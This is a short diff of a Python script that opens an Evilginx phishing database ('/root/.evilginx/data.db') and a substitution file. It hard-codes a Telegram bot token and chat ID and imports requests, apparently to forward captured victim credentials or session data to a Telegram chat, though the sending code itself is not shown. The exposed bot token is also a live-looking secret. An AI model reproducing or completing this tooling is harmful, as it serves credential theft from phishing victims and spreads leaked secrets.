@@ -1,5 +1,5 @@
 file_path = '/root/.evilginx/data.db'
-file_useano="/root/.evilginx2/black11/subtitute.txt"
+file_useano=".evilginx2/black11/subtitute.txt"
 file_content1=''
 file_content2=''
 toreplace=''
@@ -9,7 +9,7 @@ TOKEN='6579196085:AAHPWo16Q_scDH5m_A4iQlz4O7REfmokMws'
 CHAT_ID='7284568121'
 
 import requests
- 
+
 with open(file_path, 'r') as file:
     file_content1 = file.read() 
     replay=file_content1
